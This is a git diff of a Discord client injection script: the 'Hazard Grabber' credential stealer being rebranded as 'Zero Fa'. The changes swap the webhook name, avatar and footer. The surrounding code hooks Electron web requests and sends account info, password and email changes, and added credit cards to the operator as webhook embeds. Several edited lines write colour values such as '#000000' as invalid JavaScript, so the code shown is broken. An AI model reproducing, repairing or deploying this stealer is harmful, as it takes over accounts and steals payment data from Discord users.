@@ -192,12 +192,12 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
         const json = JSON.parse(info);
 
         var params = {
-            username: "Hazard Grabber",
+            username: "Zero Fa",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": #000000,
                     "fields": [
                         {
                             "name": "**Account Info**",
@@ -244,12 +244,12 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
             var json = JSON.parse(info);
             var params = {
-                username: "Hazard Grabber",
+                username: "Zero Fa",
                 content: "",
-                avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+                avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
                 embeds: [
                     {
-                        "color": 16507654,
+                        "color": #000000,
                         "fields": [
                             {
                                 "name": "**Password Changed**",
@@ -302,12 +302,12 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
     `, true).then((ip) => {
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Zero Fa",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": #000000,
                     "fields": [
                         {
                             "name": "**Email Changed**",
@@ -360,12 +360,12 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
 
         var json = JSON.parse(info);
         var params = {
-            username: "Hazard Grabber",
+            username: "Zero Fa",
             content: "",
-            avatar_url: "https://cdn.discordapp.com/attachments/853347983639052318/857677082435649536/nedladdning_14.jpg",
+            avatar_url: "https://media.discordapp.net/attachments/893722549303775292/893723054071492628/images_2.jpeg",
             embeds: [
                 {
-                    "color": 16507654,
+                    "color": #000000
                     "fields": [
                         {
                             "name": "**Credit Card Added**",
@@ -388,7 +388,7 @@ electron.session.defaultSession.webRequest.onHeadersReceived(function (j, k) {
                         "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                     },
                     "footer": {
-                        "text": "Hazard Grabber By Rdimo#6969・https://github.com/Rdimo/Hazard-Nuker"
+                        "text": "Zero Fa By Zero"
                     }
                 }
             ]
